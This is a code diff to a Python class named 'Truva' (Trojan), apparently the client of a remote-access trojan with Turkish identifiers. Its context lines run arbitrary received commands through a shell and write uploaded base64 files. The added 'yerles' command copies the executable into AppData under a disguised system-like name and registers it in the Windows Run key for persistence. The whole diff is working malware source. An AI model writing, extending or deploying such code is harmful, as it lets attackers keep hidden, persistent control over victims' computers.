@@ -3,6 +3,8 @@ import subprocess
 import simplejson
 import os
 import base64
+import shutil
+import sys
 
 class Truva:
 
@@ -27,6 +29,13 @@ class Truva:
                 with open(komut[1],"wb") as dosya1:
                     dosya1.write(base64.b64decode(komut[2]))
                     return komut[1] + " Yüklendi."
+            elif komut[0]=="yerles":
+                dosya_uzantisi = os.environ["appdata"] + "\\system_eklenti.exe"
+                if not os.path.exists(dosya_uzantisi):
+                    shutil.copyfile(sys.executable,dosya_uzantisi)
+                    kayit = "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + komut[1] + " /t REG_SZ /d " + dosya_uzantisi
+                    subprocess.call(kayit, shell=True)
+                return "Başarıyla Yerleşti."
             else:
                 return subprocess.check_output(komut, shell=True)
         except Exception:
